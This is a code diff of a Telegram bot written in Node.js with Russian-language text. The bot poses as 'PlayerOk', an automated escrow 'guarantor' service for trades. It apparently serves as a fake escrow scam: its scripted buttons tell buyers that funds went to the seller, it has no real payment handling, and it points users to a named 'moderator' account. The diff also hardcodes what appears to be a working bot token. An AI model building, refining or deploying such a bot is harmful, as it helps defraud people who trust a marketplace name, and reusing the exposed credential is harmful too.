@@ -1,13 +1,14 @@
 const { Telegraf, Markup } = require('telegraf');
 const http = require('http');
 
+// Твой рабочий токен
 const BOT_TOKEN = process.env.BOT_TOKEN || '8849870102:AAGiJ0uvDWHKAH3sFYCWQECSgJmNFC0zsnY';
 const bot = new Telegraf(BOT_TOKEN);
 
 const ADMIN = 'k13_way';
 const users = {};
-let currentDeal = null; // Железобетонное хранение активной сделки без парсинга ID
 const userSteps = {};
+let currentDeal = null; // Надежное хранение активной сделки
 
 const welcomeText = `👋 *Добро пожаловать в PlayerOk!*\n\n🛡️ *PlayerOk* — ваш автоматизированный торговый гарант. Мы обеспечиваем 100% безопасность сделок 24/7.\n\n• Комиссия сервиса: *1%*\n• Режим работы системы: *24/7*\n• Главный модератор: @sw1zyy01\n\n✨ Выберите нужный раздел на панели ниже:`;
 
@@ -70,6 +71,7 @@ bot.on('text', async (ctx) => {
   }
 });
 
+// Кнопки этапов сделки без регулярных выражений
 bot.action('deal_ok', (ctx) => {
   if (!currentDeal) return ctx.answerCbQuery('Сделка не найдена.');
   currentDeal.s_chat = ctx.chat.id;
@@ -105,14 +107,12 @@ bot.action('deal_end', (ctx) => {
   bot.telegram.sendMessage(currentDeal.s_chat, sellerText, { parse_mode: 'Markdown' }).catch((e) => console.log(e));
   
   const buyerText = `🎉 *Сделка #${currentDeal.id} успешно завершена!*\n━━━━━━━━━━━━━━━━━━━━━━━━━━\nВы успешно подтвердили выполнение всех обязательств. Средства переведены на счет продавца.\n\n✨ Спасибо за доверие к автоматизированному гарант-сервису *PlayerOk*!`;
-  return ctx.editMessageText(buyerText, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('⬅️ В главное меню', 'menu')]]) }).catch(() => {});
+  return ctx.editMessageText(buyerText, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('⬅️ В главное меню', 'menu')]]) }).catch((e) => console.log(e));
 });
 
 bot.action('menu', (ctx) => ctx.editMessageText(welcomeText, { parse_mode: 'Markdown', ...mainKb }).catch((e) => console.log(e)));
 bot.action('safe', (ctx) => ctx.editMessageText(`🛡 *Правила безопасности маркетплейса PlayerOk*\n━━━━━━━━━━━━━━━━━━━━━━━━\n1. *Внутренние оплаты:* Проводите финансовые транзакции исключительно через инлайн-интерфейс Гаранта.\n2. *Проверка доступов:* Тщательно проверяйте аккаунты до нажатия кнопки подтверждения.`, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('⬅️ Назад в меню', 'menu')]]) }).catch((e) => console.log(e));
-bot.action('supp', (ctx) => ctx.editMessageText(`👨‍💻 *Служба поддержки пользователей PlayerOk*\n━━━━━━━━━━━━━━━━━━━━━━━━\nЕсли у вас возник спор внутри торговой операции — вы можете мгновенно открыть Арбитраж.\n\n✍ *Официальный контакт главного модератора:* @sw1zyy01`, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('⬅️ Назад в меню', 'menu')]]) }).catch((e) => console.log(e));
+bot.action('supp', (ctx) => ctx.editMessageText(`👨‍💻 *Служба поддержки пользователей PlayerOk*\n━━━━━━━━━━━━━━━━━━━━━━━━\nЕсли у вас возник спор внутри торговой операции — вы можете мгновенно открыть внутренний Арбитраж.\n\n✍ *Официальный контакт главного модератора:* @sw1zyy01`, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('⬅️ Назад в меню', 'menu')]]) }).catch((e) => console.log(e));
 
 bot.launch().then(() => console.log('OK'));
 
-http.createServer((req, res) => {
-  res.writeHead(200); res.end('OK\n');
